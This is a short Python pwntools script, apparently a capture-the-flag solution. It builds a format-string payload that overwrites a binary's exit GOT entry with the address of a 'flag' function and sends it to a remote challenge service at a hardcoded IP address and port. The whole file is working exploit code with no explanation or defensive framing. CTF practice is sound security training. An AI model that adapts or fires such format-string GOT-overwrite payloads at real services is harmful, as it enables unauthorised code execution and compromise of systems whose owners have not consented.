import struct
from pwn import *
context.log_level = 'debug'

flag = 0x80491c2
exit_got = 	0x804c01c 

def pad(s):
    return s+"X"*(576-len(s))

exploit = ""
exploit += p32(exit_got)
exploit += p32(exit_got+2)
exploit += "aaaaaaaa"
exploit += "%4$37298x"
exploit += "%4$n"
exploit += "%30274x"
exploit += "%5$n"

#chl = process('./chal16')
chl = remote('103.157.96.13', 7781)
#chl=remote('10.0.2.15',5555)
chl.recvuntil("Ketik Nama anda : ")
chl.sendline(pad(exploit))
print chl.recvall()
